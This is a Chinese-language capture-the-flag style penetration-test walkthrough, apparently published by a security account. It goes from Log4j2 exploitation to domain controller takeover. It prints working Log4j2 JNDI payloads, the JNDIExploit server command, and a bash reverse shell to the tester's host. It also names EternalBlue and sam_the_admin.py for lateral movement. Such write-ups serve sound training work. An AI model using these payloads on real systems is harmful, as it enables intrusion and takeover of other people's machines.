# 外网渗透

首先，我们对目标Web服务器进行了端口扫描，发现了开放的38080和22端口。访问38080端口后发现显示了一个错误页面。尝试使用Wappalyzer工具来识别该网站所使用的框架，但未能成功检测出具体架构。通过搜索遇到的错误信息，推测可能是基于Spring Boot构建的应用。

为进一步确认，再次利用Goby进行扫描，结果支持了先前关于Spring框架的假设，不过没有发现明显的安全漏洞。考虑到近期曝光的Log4j2漏洞，怀疑可能仅作为日志组件存在，并非完整的应用框架。

为了验证是否存在Log4j2漏洞，我们构造并发送了如下payload：
```
${jndi:ldap://p9j8l8.dnslog.cn}
```
经测试确实收到了响应，表明目标系统存在该漏洞。

接下来，我们试图利用此漏洞执行远程代码。首先启动了一个本地LDAP服务：
```
java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.1.105
```
然后修改HTTP请求头中的`Content-Type`字段为`application/x-www-form-urlencoded`，并发送以下payload以触发命令执行：
```
${jndi:ldap://192.168.1.105:1389/TomcatBypass/TomcatEcho}
```
成功获取到了命令执行的结果。

之后，我们设置Netcat监听器，并准备反弹Shell所需的命令（需先经过Base64编码及URL双重编码）：
```
bash -i >& /dev/tcp/192.168.1.105/9999 0>&1
```
将编码后的字符串嵌入到新的payload中：
```
${jndi:ldap://192.168.1.105:1389/TomcatBypass/Command/Base64/<双层URL编码后的Base64串>}
```
最终实现了反向Shell连接。

在初步的信息收集过程中得知目标环境运行于Docker容器内，尝试逃逸未果后继续深入探索。最终，在根目录下找到了第一个flag文件。由于之前已知22端口对外开放，故尝试通过SSH直接登录，并成功获得了宿主机权限。

# 内网渗透

登录后使用`ifconfig`命令查看网络配置，发现还有一块IP地址位于10.0.1.0/24网段的网络接口。本可选择使用Cobalt Strike等工具进一步操作，但这里选择了Linux自带工具进行探测。

使用如下脚本来扫描指定网段内的活动主机：
```bash
for i in 10.0.1.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i "Find the target"; fi; done
```

确定有存活主机后，采用Venom生成针对Linux x86平台的Meterpreter payload，并将其上传至目标机器执行，从而获得了一个Meterpreter会话。

随后添加了通往10.0.1.0/24网段的新路由，并配置ProxyChains以便通过代理链路访问内网资源。接着对特定IP地址进行了端口扫描，发现其开放了445端口（SMB服务）。进一步检查发现目标系统版本为Windows 7 SP1，并且存在MS17-010漏洞（永恒之蓝）。

利用该漏洞成功获取到了一个具有System权限的Meterpreter会话，并从中提取了第二个flag文件。此时注意到目标同样拥有两张网络接口卡，其中一张属于10.0.0.0/24网段。通过查询DNS记录得知域控制器的IP地址为10.0.0.12。

尝试了几种不同的攻击手段后决定采用CVE-2021-42287与CVE-2021-42278组合漏洞来进行提权。虽然PowerShell无法正常工作，但我们还是设法通过Python脚本sam_the_admin.py实现了对域控的完全控制，并最终取得了第三个flag。

---

感谢阅读！如果您对网络安全感兴趣，请关注我们的公众号：红队蓝军。